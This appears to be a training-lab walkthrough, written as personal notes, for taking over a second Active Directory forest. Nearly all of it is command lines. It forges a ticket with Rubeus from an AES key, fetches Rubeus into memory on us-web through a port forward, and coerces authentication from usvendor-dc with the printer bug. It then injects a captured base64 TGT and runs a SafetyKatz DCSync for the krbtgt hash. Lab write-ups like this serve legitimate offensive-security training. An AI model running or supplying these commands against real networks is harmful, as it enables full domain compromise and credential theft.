

Task

 • Abuse the Unconstrained Delegation on us-web to get Enterprise Admin privileges on usvendor.local.



If TGT Delegation is enabled across forests trusts, we can abuse the printer bug across two-way forest trusts as well. This hands-on is kept separate from the previous ones because the impact is very high! The commands included are the same! Start a new process as webmaster, who has admin privileges on us-web:

```
echo %Pwn% asktgt
```

```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:webmaster /aes256:2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

![[Pasted image 20250324224100.png]]

Copy Loader.exe to us-web to download and execute Rubeus in the memory and start monitoring for any authentication from usvendor-dc. Run the below command in process running as webmaster:

```
echo F | xcopy C:\AD\Tools\Loader.exe \\us-web\C$\Users\Public\Loader.exe /Y
```

```
winrs -r:us-web cmd
```

```
echo %Pwn% monitor
```

```
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.139
```

```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args %Pwn% /targetuser:usvendor-dc$ /interval:5 /nowrap
```


![[Pasted image 20250324224414.png]]
Next, run MS-RPRN.exe on the student VM to abuse the printer bug. Note that this time we target usvendor-dc:

```
C:\AD\Tools\MS-RPRN.exe \\usvendor-dc.usvendor.local \\usweb.us.techcorp.local
```

We can copy Base64EncodedTicket, remove unnecessary spaces and newline (if any) and use the ticket with Rubeus on the student VM:

```
echo %Pwn% ptt
```

```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /ticket: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
```

We can now run DCSync attack against usvendor-dc using the injected ticket:

```
echo %Pwn% lsadump::dcsync
```

```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "%Pwn% /user:usvendor\krbtgt /domain:usvendor.local" "exit"
```

![[Pasted image 20250324224603.png]]

